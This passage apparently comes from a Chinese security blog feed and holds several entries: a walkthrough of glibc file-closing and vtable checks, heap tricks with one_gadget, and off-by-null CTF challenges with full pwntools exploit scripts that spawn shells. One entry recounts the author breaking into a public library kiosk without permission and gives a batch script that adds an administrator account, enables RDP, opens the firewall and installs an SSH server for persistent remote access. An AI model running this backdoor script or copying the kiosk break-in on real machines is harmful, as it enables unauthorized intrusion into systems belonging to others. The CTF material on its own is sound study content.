class="code"><pre><span class="line"></span><br><span class="line">##### _IO_setb</span><br><span class="line">进入_IO_setb，可以看到释放了缓冲区</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_setb (_IO_FILE <em>f, char </em>b, char *eb, int a)<br>{<br>  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    free (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  if (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  else<br>    f-&gt;_flags |= _IO_USER_BUF;<br>}<br>libc_hidden_def (_IO_setb)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">返回之后，再次调用了_IO_un_link</span><br></pre></td></tr></table></figure></p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);<br>  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;<br>  fp-&gt;_fileno = -1;<br>  fp-&gt;_offset = _IO_pos_BAD;</p><p>  return close_status ? close_status : write_status;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">返回到_IO_new_close函数，最后调用_IO_FINISH，进入到fileopsc.c中的_IO_new_file_finish</span><br><span class="line"></span><br><span class="line">#### _IO_FINISH-&gt;_IO_new_file_finish  </span><br><span class="line"></span><br><span class="line">看到先检查文件是否仍打开，如果打开就刷新缓冲区并关闭，不过之前已经关闭过了，这里会直接进入genops.c中的_IO_default_finish</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_new_file_finish (FILE *fp, int dummy)<br>{<br>  if (_IO_file_is_open (fp))<br>    {<br>      _IO_do_flush (fp);<br>      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))<br>    _IO_SYSCLOSE (fp);<br>    }<br>  _IO_default_finish (fp, 0);<br>}<br>libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### _IO_default_finish</span><br><span class="line">可以看到还是对缓冲区的释放，指针的释放等等</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_default_finish (FILE <em>fp, int dummy)<br>{<br>  struct _IO_marker </em>mark;<br>  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    {<br>      free (fp-&gt;_IO_buf_base);<br>      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = NULL;<br>    }</p><p>  for (mark = fp-&gt;_markers; mark != NULL; mark = mark-&gt;_next)<br>    mark-&gt;_sbuf = NULL;</p><p>  if (fp-&gt;_IO_save_base)<br>    {<br>      free (fp-&gt;_IO_save_base);<br>      fp-&gt;_IO_save_base = NULL;<br>    }</p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);</p><p>#ifdef _IO_MTSAFE_IO<br>  if (fp-&gt;_lock != NULL)<br>    _IO_lock_fini (*fp-&gt;_lock);</p><p>#endif<br>}<br>libc_hidden_def (_IO_default_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">最后返回后对fp指针进行了free，就结束了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2.24 check</span><br><span class="line"></span><br><span class="line">libc 2.24 之后专门添加了对虚表的检查，分别是/libio/libioP.h中的IO_validate_vtable 与 /libio/vtables.c中的_IO_vtable_check。</span><br><span class="line"></span><br><span class="line">所有的 libio vtables 被放进了专用的只读的 __libc_IO_vtables 段，以使它们在内存中连续。在任何间接跳转之前，vtable 指针将根据段边界进行检查，如果指针不在这个段，则调用函数 _IO_vtable_check() 做进一步的检查，并且在必要时终止进程。</span><br></pre></td></tr></table></figure></p><p>/<em> Perform vtable pointer validation.  If validation fails, terminate<br>   the process.  </em>/<br>static inline const struct _IO_jump_t <em><br>IO_validate_vtable (const struct _IO_jump_t </em>vtable)<br>{<br>  /<em> Fast path: The vtable pointer is within the __libc_IO_vtables<br>     section.  </em>/<br>  uintptr_t section_length = <strong>stop_</strong>libc_IO_vtables - <strong>start_</strong>libc_IO_vtables;<br>  uintptr_t ptr = (uintptr_t) vtable;<br>  uintptr_t offset = ptr - (uintptr_t) <strong>start_</strong>libc_IO_vtables;          </p><p>  /* 对vtable指针范围进行检查，不满足则调用_IO_vtable_check进行检查</p><p>  if (__glibc_unlikely (offset &gt;= section_length))<br>    /<em> The vtable pointer is not in the expected section.  Use the<br>       slow path, which will terminate the process if necessary.  </em>/<br>    _IO_vtable_check ();<br>  return vtable;<br>}</p><p>void attribute_hidden<br>_IO_vtable_check (void)<br>{</p><p>#ifdef SHARED<br>  /<em> Honor the compatibility flag.  </em>/<br>  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</p><p>#ifdef PTR_DEMANGLE<br>  PTR_DEMANGLE (flag);</p><p>#endif<br>  if (flag == &amp;_IO_vtable_check)<br>    return;</p><p>  /<em> In case this libc copy is in a non-default namespace, we always<br>     need to accept foreign vtables because there is always a<br>     possibility that FILE </em> objects are passed across the linking<br>     boundary.  <em>/<br>  {<br>    Dl_info di;<br>    struct link_map </em>l;<br>    if (!rtld_active ()<br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0<br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      return;<br>  }</p><p>#else /<em> !SHARED </em>/<br>  /<em> We cannot perform vtable validation in the static dlopen case<br>     because FILE </em> handles might be passed back and forth across the<br>     boundary.  Therefore, we disable checking in this case.  */<br>  if (__dlopen != NULL)<br>    return;</p><p>#endif</p><p>  __libc_fatal (“Fatal error: glibc detected an invalid stdio handle\n”);<br>}</p><p><code>`</code></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> io_file </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Problem Solve Tricks</title>
      <link href="/2019/07/06/problem-solve-tricks/"/>
      <url>/2019/07/06/problem-solve-tricks/</url>
      <content type="html"><![CDATA[<h1 id="malloc-hook-amp-amp-one-gadget"><a href="#malloc-hook-amp-amp-one-gadget" class="headerlink" title="malloc_hook &amp;&amp; one_gadget"></a>malloc_hook &amp;&amp; one_gadget</h1><p>之前经常遇到one_gadget条件不满足使得最后覆盖malloc_hook之后无法getshell，前两天从ex师傅那里学到了一个好办法。</p><p>将one_gadget 填入realloc_hook处，然后malloc_hook处填上__libc_realloc处的地址，因为调用realloc时会先检测realloc_hook，所以仍然能够调用one_gadget，为了能够满足one_gadget的条件（一般是对栈内存有要求），可以通过realloc代码开始处的寄存器push操作来进行栈帧调整，使得条件满足来getshell</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>终端渗透记录-lib</title>
      <link href="/2019/06/15/%E7%BB%88%E7%AB%AF%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-lib/"/>
      <url>/2019/06/15/%E7%BB%88%E7%AB%AF%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-lib/</url>
      <content type="html"><![CDATA[<p><em>前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来</em></p><p>上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来</p><p>一般触控的主机，长按是相当于鼠标右键的点击的，在主页上打开右键，发现里面有全局设置</p><p>再打开全局设置的话，看到了有关于flash插件播放器的问题，看样子是需要联网的，点击链接会调出浏览器，同时出现的还有加速球hhh，get！</p><p>后面在尝试调用右键的时候经常会半天出不来，这时可以进到关于简介的地方，随便把一句话括起来，就会出现复制打印之类的选项</p><p>选择打印会弹出小框，而且也会弹出加速球，有了加速球其实就好解决了</p><p>加速器本身很难点进去，长按也没啥反应，但是加速球带着网络速度的检查，而在网速检查中，有推荐你清理垃圾的选项hhh</p><p>点击清理垃圾就能够把电脑管家给召唤出来。</p><p>为了能够更方便的操作，先将电脑中的teamviewer升级（ps:神奇的是之前确实是有下好的），但是没法打开，或者是打开也看不到</p><p>类似于是看报的界面是置顶的，在电脑管家中找找还有什么好用的软件，之前在浏览器里下载的搜狗输入法直接被删了，或许是有检测</p><p>但是看样子teamviewer之前就是用电脑管家下的，或许这里的不会被删掉，为了后面更加方便，这里下载了搜狗输入法（ps:不用问没有输入法怎么下的，毕竟榜单前列）</p><p>在看电脑管家工具箱时看到了桌面整理和小Q桌面hhh，尝试使用桌面整理，下载安装完之后，突然出现了桌面hhh</p><p>想打开我的电脑，但是打开就被直接关闭了，后台应该是有应用在监控文件管理器的打开（其实想看有啥东西还是挺简单的，浏览器查看本机文档完全无障碍），想开任务管理器，软键盘欲罢不能</p><p>后面一通操作之后，桌面又出不来了（哭），就勉强使用小Q桌面一用，打开之前升级的teamviewer，电子邮箱不能输入（暴哭）</p><p>到这一步感觉没办法的时候，索性重装一下teamviewer，bingo，远程连接ok了hhh</p><p>不过这样子实在是不安全，万一到时候拿着teamviewer账号找上门就尴尬了，好在先teamviewer控制，后面带电脑过去操控就比较方便了。</p><p>目前的想法，为了能够更方便地控制还不被被监控端看到，完全可以传一个远控码过去，因为没有能绕过监控的码（菜），不过应该是可以用teamviewer放到白名单然后开机自启动吧hhh。</p><p>没有码只能建个新的管理员权限的用户然后开通ssh服务远程连接使用，为了方便流程写了个bat脚本,隐藏用户的方法没建成功，就在最后设置成开机不要求密码来解决每天自动开机后卡在登陆界面的问题（主要是为了方便操作，没有能够隐蔽操作，打开文件之类的都是拿teamviewer提前传好的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">net user administratore admin /add</span><br><span class="line">net user administratore /active:yes</span><br><span class="line">net user administratore /expires:never</span><br><span class="line">net localgroup Administrators administratore /add</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start C:\Users\Administrator\Library\setupssh-8.0p1-2.exe </span><br><span class="line">pause</span><br><span class="line">cd C:\openSSH\bin</span><br><span class="line">mkgroup -l &gt;&gt; ..\etc\group</span><br><span class="line">mkpasswd -l &gt;&gt; ..\etc\passwd</span><br><span class="line">md home</span><br><span class="line">md home\Administrator</span><br><span class="line">md home\Administrator\.ssh</span><br><span class="line"></span><br><span class="line">echo C:\openSSH</span><br><span class="line">echo Protocol 2  &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitRootLogin no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitEmptyPasswords no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PasswordAuthentication yes    &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo RSAAuthentication yes       &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PubkeyAuthentication yes   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo AuthorizedKeysFile .ssh/authorized_keys &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">net start opensshd</span><br><span class="line"></span><br><span class="line">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home Yes</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v native /t REG_SZ /d &quot;C:\openSSH\home&quot;</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v flags /t REG_DWORD /d 0x0000000a</span><br><span class="line"></span><br><span class="line">start control userpassword2</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>off-by-null --more challenge</title>
      <link href="/2019/06/08/off-by-null-more-challenge/"/>
      <url>/2019/06/08/off-by-null-more-challenge/</url>
      <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>之前随便出的题</p><h2 id="障碍"><a href="#障碍" class="headerlink" title="障碍"></a>障碍</h2><p>低版本libc，没有开启PIE，常见的四项功能都有，edit中存在off-by-null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void get_str(char *ptr,int size)&#123;</span><br><span class="line">    int tmp=0;</span><br><span class="line">    if(size&lt;0)&#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;size;i++)&#123;</span><br><span class="line">        read(0,(ptr+i),1);</span><br><span class="line">        tmp = i;</span><br><span class="line">        if(*(ptr+i)==&apos;\n&apos;)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(ptr+tmp+1)=0;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前信安大赛提供的赛题就是这个难度的洞，上面为源码。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>没有开启PIE其实就很简单，基本上各方面都没有太多限制，通过溢出overlap来控制指针，下面要么直接控制修改malloc_hook处，要么麻烦一点改bss段指针再任意地址写getshell，之前是直接修改为one_gadget后条件不满足，顺便就把PIE给关了，难度低一点友好点没啥坏处。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./tinynote&apos;)</span><br><span class="line">elf = ELF(&apos;./tinynote&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">        sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">#--------------over lapping---------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">add(0x18,&apos;1&apos;)</span><br><span class="line">add(0x18,&apos;2&apos;)</span><br><span class="line">add(0x110,&apos;3&apos;*0xf0+p64(0x100)+p64(0x21))</span><br><span class="line">add(0x18,&apos;4&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">edit(2,0x18,&apos;2&apos;*0x10+p64(0xe0))</span><br><span class="line">dele(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------leak libc---------------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">show(1)</span><br><span class="line">leak = u64(sh.recv(8))</span><br><span class="line">libc_base = leak-88-0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line">one = libc_base +0x4526a#+libc.symbols[&apos;system&apos;]</span><br><span class="line">#--------------------------------------</span><br><span class="line">#edit(1,0x18,p64(leak)+p64(leak-88-0x33))</span><br><span class="line">#add(0x60,&apos;a&apos;*0x13)</span><br><span class="line">add(0x18,&apos;3&apos;)</span><br><span class="line">add(0x60,&apos;5&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">edit(5,8,p64(0x60203d))</span><br><span class="line">add(0x60,&apos;2&apos;)</span><br><span class="line">add(0x60,&apos;\x00&apos;*0x13+p64(0x90)+p64(1)+p64(libc.symbols[&apos;__free_hook&apos;]+libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0,8,p64(one))</span><br><span class="line">dele(2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>西湖论剑的一道题目貌似</p><h2 id="障碍-1"><a href="#障碍-1" class="headerlink" title="障碍"></a>障碍</h2><p>libc版本升级到2.27左右，存在tcache机制，许多操作开始需要绕过tcache机制来实现，但整体思路没有太大的变化。<br>同时这个题的溢出点从edit到了add，相对麻烦一点就是了。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>多分配一些chunk来将tcache填满，之后对剩下的chunk进行off-by-null实现overlap，好处就是tcache减少了对size的检查，后面更容易实现</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">    sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>rctf 2019-babyheap</p><h2 id="障碍-2"><a href="#障碍-2" class="headerlink" title="障碍"></a>障碍</h2><p>较低版本libc，开启PIE，但是禁用了fastbin，同时关闭了system execve的系统调用<br>这样基本上无法覆盖bss段的指针，即使想办法可以控制malloc_hook或free_hook指针，也无法直接系统调用getshell</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>通过chunk overlap泄露libc地址，再次调用通过house of storm控制<strong>free_hook，<br>把</strong>free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，<br>然后读入我们新的shellcode，在跳到新的shellcode去执行getshell。</p><p>另一种思路，泄露堆地址与libc地址，写rop, shellcode到heap，largebin attack &amp; unsortbin attack直接在libc上的free_hook分配chunk<br>将栈转移到heap上，执行rop，执行shellcode getshell。</p><p>这里的shellcode都是通过open read write来实现flag的读取。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>待补充<br><a href="https://xz.aliyun.com/t/5216#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216#toc-2</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ciscn 2019 pwn</title>
      <link href="/2019/06/04/ciscn-2019-pwn/"/>
      <url>/2019/06/04/ciscn-2019-pwn/</url>
